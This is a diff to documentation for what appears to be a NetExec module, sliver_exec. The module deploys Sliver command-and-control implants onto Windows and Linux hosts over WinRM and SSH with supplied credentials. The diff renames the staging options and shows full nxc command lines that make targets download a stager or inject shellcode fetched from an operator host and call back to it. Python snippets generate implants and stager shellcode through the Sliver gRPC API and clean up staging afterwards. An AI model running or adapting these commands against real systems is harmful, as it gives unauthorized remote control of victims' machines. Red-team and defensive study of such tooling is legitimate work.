@@ -141,20 +141,20 @@ A two-stage approach that executes a tiny download cradle on the target, which t
 
 **Configuration:**
 ```bash
-# Windows
+ # Windows
 nxc winrm 192.168.1.10 -u user -p pass -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=True STAGER_PORT=8080 STAGING_METHOD=powershell
+     STAGING=download HTTP_STAGING_PORT=8080 DOWNLOAD_TOOL=powershell
 
-# Linux
+ # Linux
 nxc ssh 192.168.1.50 -u root -p pass -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=True STAGER_PORT=8080 STAGING_METHOD=wget
+     STAGING=download HTTP_STAGING_PORT=8080 DOWNLOAD_TOOL=wget
 ```
 
 ---
 
-### 3. TCP/HTTP Shellcode Injection (Legacy)
+### 3. TCP/HTTP Shellcode Injection
 
 In-memory shellcode injection using Sliver's stager mechanism. Two-stage process: bootstrap shellcode + full implant fetch.
 
@@ -196,13 +196,12 @@ In-memory shellcode injection using Sliver's stager mechanism. Two-stage process
 **Use Cases:**
 - When in-memory execution is required
 - WinRM-based deployments
-- Legacy compatibility
 
-**Configuration:**
+ **Configuration:**
 ```bash
-nxc winrm 192.168.1.10 -u user -p pass -M sliver_exec \
-  -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=True STAGER_RHOST=10.0.0.5 STAGER_RPORT=8080 STAGER_PROTOCOL=tcp
+ nxc winrm 192.168.1.10 -u user -p pass -M sliver_exec \
+   -o RHOST=10.0.0.5 RPORT=8888 \
+      STAGING=shellcode SHELLCODE_LISTENER_HOST=10.0.0.5 SHELLCODE_LISTENER_PORT=8080 SHELLCODE_PROTOCOL=tcp
 ```
 
 ---
@@ -211,7 +210,7 @@ nxc winrm 192.168.1.10 -u user -p pass -M sliver_exec \
 
 ### Sliver API Interactions
 
-The module uses the Sliver gRPC API via the `sliver-py` client library:
+The module uses the Sliver gRPC API:
 
 **Implant Generation:**
 ```python
@@ -248,7 +247,7 @@ await client._stub.WebsiteRemove(Website(Name="staging"))
 await client._stub.KillJob(KillJobReq(ID=job_id))
 ```
 
-**TCP/HTTP Shellcode Staging (Legacy):**
+**TCP/HTTP Shellcode Staging:**
 ```python
 # 1. Generate stager shellcode
 stage_req = clientpb.GenerateStageReq(...)
@@ -366,7 +365,7 @@ def _wait_for_beacon_and_cleanup(self, implant_name, wait_seconds, cleanup_artif
             if beacon.Name == implant_name:
                 # Beacon found! Cleanup if requested
                 if cleanup_artifacts:
-                    if self.stager_port:  # HTTP staging mode
+                    if self.http_staging_port:  # HTTP staging mode
                         await worker._do_website_remove(website_name)
                         await worker._do_kill_job(http_job_id)
                     else:  # Direct upload mode
